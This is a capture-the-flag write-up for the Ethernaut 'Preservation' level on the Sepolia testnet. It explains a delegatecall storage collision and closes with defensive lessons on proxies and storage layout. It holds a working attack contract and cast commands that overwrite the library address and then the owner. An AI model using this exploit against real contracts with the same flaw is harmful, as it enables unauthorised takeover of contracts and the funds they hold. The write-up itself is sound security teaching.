# 16 - Preservation

## Overview

- **Difficulty:** 8/10
- **Network:** Sepolia Testnet
- **Instance Address:** [`0xe084cd653d9ad62460408b95c444f43145cd7751`](https://sepolia.etherscan.io/address/0xe084cd653d9ad62460408b95c444f43145cd7751)
- **Attack Contract (`PreservationCaller`):** [`0x288f1b598a207e7dd2fbfc477f581d1097ea56c6`](https://sepolia.etherscan.io/address/0x288f1b598a207e7dd2fbfc477f581d1097ea56c6)
- **Transactions:**
  - **1. Deploy (`PreservationCaller`):** [`0x95ecbfb98b48bf9ad035cf0c618d37c6648ddf6b24578831f206fcd1235274fb`](https://sepolia.etherscan.io/tx/0x95ecbfb98b48bf9ad035cf0c618d37c6648ddf6b24578831f206fcd1235274fb)
  - **2. Step 1 — Overwrite `timeZone1Library` (`setFirstTime()`):** [`0x9228c32440b2dc243a82804c8071bc848216ca32ca60048b2778a32634a33627`](https://sepolia.etherscan.io/tx/0x9228c32440b2dc243a82804c8071bc848216ca32ca60048b2778a32634a33627)
  - **3. Step 2 — Overwrite `owner` (`setFirstTime()`):** [`0x17241e04bc7fe8589970cbb47dfcebcf8d23489e7342516247712eaa37359130`](https://sepolia.etherscan.io/tx/0x17241e04bc7fe8589970cbb47dfcebcf8d23489e7342516247712eaa37359130)
  - **4. Level Submission:** [`0x83e04bf9c41168eacd6ffe1bd44ac2b0683c282d369ff612d09944851adec770`](https://sepolia.etherscan.io/tx/0x83e04bf9c41168eacd6ffe1bd44ac2b0683c282d369ff612d09944851adec770)

---

## Objective

Claim ownership of the `Preservation` contract instance.

---

## Contract Analysis

The target contracts are in [`src/16-preservation/Preservation.sol`](./Preservation.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```

---

### Vulnerability Breakdown: `delegatecall` Storage Collision

In Solidity, `delegatecall` executes code from an external contract inside the **storage context of the calling contract**.

Variables in Solidity are laid out sequentially into 32-byte storage slots starting from index 0.

#### Storage Layout Comparison

| Slot  | `Preservation` Contract           | `LibraryContract`    |
| :---: | :-------------------------------- | :------------------- |
| **0** | `address public timeZone1Library` | `uint256 storedTime` |
| **1** | `address public timeZone2Library` | _(Unused)_           |
| **2** | `address public owner`            | _(Unused)_           |
| **3** | `uint256 storedTime`              | _(Unused)_           |

Notice the critical discrepancy:

- In `LibraryContract`, `storedTime` is at **Slot 0**.
- In `Preservation`, **Slot 0 is `timeZone1Library`**, while `storedTime` is all the way down at **Slot 3**!

When `Preservation.setFirstTime(_timeStamp)` runs:

```solidity
timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
```

`LibraryContract.setTime` executes `storedTime = _time`. Because of `delegatecall`, this write modifies **Slot 0 of `Preservation`** (`timeZone1Library`), NOT `storedTime`!

---

### The Two-Step Exploit

```text
Step 1: Hijack timeZone1Library
[ Player ] ─── setFirstTime(PreservationCaller) ───▶ [ Preservation ]
                                                           │
                                                           │ delegatecall setTime(caller)
                                                           ▼
                                                 [ LibraryContract ]
                                                           │
                                                           └── Writes to Slot 0 of Preservation!
                                                               (Preservation.timeZone1Library = PreservationCaller)

Step 2: Hijack owner
[ Player ] ─── setFirstTime(player) ───────────────▶ [ Preservation ]
                                                           │
                                                           │ delegatecall setTime(player)
                                                           ▼
                                                 [ PreservationCaller ]
                                                           │
                                                           └── Writes to Slot 2 of Preservation!
                                                               (Preservation.owner = Player EOA) 🎯
```

---

## Attack Contract

The exploit is implemented in [`src/16-preservation/PreservationCaller.sol`](./PreservationCaller.sol):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract PreservationCaller {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    fallback() external payable {
        uint256 data = msg.value;
        owner = address(uint160(data));
    }

    function setTime(uint256 /*_time*/) public {
        owner = msg.sender;
    }
}
```

### Exploit Architecture

- By defining `timeZone1Library` (Slot 0), `timeZone2Library` (Slot 1), and `owner` (Slot 2), `PreservationCaller` aligns its storage layout identically with `Preservation`.
- When `setTime(uint256 _time)` is invoked under `delegatecall`, setting `owner = msg.sender` updates **Slot 2 of `Preservation`**, rewriting the owner state variable directly to the player's address!

---

## Step-by-Step Exploit Walkthrough

### 1. Deploy `PreservationCaller`

```bash
forge create src/16-preservation/PreservationCaller.sol:PreservationCaller \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME> \
  --broadcast
```

- **Deploy Tx:** [`0x95ecbfb98b48bf9ad035cf0c618d37c6648ddf6b24578831f206fcd1235274fb`](https://sepolia.etherscan.io/tx/0x95ecbfb98b48bf9ad035cf0c618d37c6648ddf6b24578831f206fcd1235274fb)
- **Deployed Address:** [`0x288f1b598a207e7dd2fbfc477f581d1097ea56c6`](https://sepolia.etherscan.io/address/0x288f1b598a207e7dd2fbfc477f581d1097ea56c6)

### 2. Step 1: Overwrite `timeZone1Library`

Pass the `PreservationCaller` address as a `uint256` to `setFirstTime()`:

```bash
# Convert address to uint256: uint256(uint160(0x288f1b598a207e7dd2fbfc477f581d1097ea56c6))
# = 232145889758782352014138096238384218679093077702

cast send 0xe084cd653d9ad62460408b95c444f43145cd7751 \
  "setFirstTime(uint256)" 232145889758782352014138096238384218679093077702 \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME>
```

- **Tx Hash:** [`0x9228c32440b2dc243a82804c8071bc848216ca32ca60048b2778a32634a33627`](https://sepolia.etherscan.io/tx/0x9228c32440b2dc243a82804c8071bc848216ca32ca60048b2778a32634a33627)

Verify that `timeZone1Library` now points to `PreservationCaller`:

```bash
cast call 0xe084cd653d9ad62460408b95c444f43145cd7751 "timeZone1Library()(address)" --rpc-url sepolia
# Output: 0x288f1b598a207e7dd2fbfc477f581d1097ea56c6
```

### 3. Step 2: Overwrite `owner`

Call `setFirstTime()` again, passing your player wallet address formatted as `uint256`:

```bash
# Convert player address to uint256: uint256(uint160(0xf511E1029dE5295f6D0dE05f4431DdA203e63607))
# = 1399479383637376031737750837564754772023531615751

cast send 0xe084cd653d9ad62460408b95c444f43145cd7751 \
  "setFirstTime(uint256)" 1399479383637376031737750837564754772023531615751 \
  --rpc-url sepolia \
  --account <ACCOUNT_NAME>
```

- **Tx Hash:** [`0x17241e04bc7fe8589970cbb47dfcebcf8d23489e7342516247712eaa37359130`](https://sepolia.etherscan.io/tx/0x17241e04bc7fe8589970cbb47dfcebcf8d23489e7342516247712eaa37359130)

### 4. Verify Ownership

Verify that `owner` is now your player address:

```bash
cast call 0xe084cd653d9ad62460408b95c444f43145cd7751 "owner()(address)" --rpc-url sepolia
# Output: 0xf511E1029dE5295f6D0dE05f4431DdA203e63607
```

### 5. Submit Level

Submit the instance on the Ethernaut dashboard:

- **Submission Tx:** [`0x83e04bf9c41168eacd6ffe1bd44ac2b0683c282d369ff612d09944851adec770`](https://sepolia.etherscan.io/tx/0x83e04bf9c41168eacd6ffe1bd44ac2b0683c282d369ff612d09944851adec770)

---

## Key Security Takeaways

1. **Storage Layout Alignment in `delegatecall`:**
   Whenever `delegatecall` is used (such as in proxy patterns like UUPS, Transparent, and Diamond), the proxy and implementation contracts **must** maintain an identical storage layout. Any misaligned state variable causes the implementation to accidentally overwrite proxy variables.
2. **Use Stateless Solidity `library`:**
   True Solidity libraries declared with the `library` keyword cannot declare state variables, which prevents accidental storage overwrites:
   ```solidity
   library SafeTimeLibrary {
       function setTime(uint256 _time) internal pure returns (uint256) {
           return _time;
       }
   }
   ```
3. **Use ERC-1967 Storage Slots for Proxies:**
   Modern proxy standards use pseudo-randomized storage slots (e.g. `bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)`) so that proxy variables (like implementation and admin addresses) never collide with implementation storage slots (which start at slot 0).
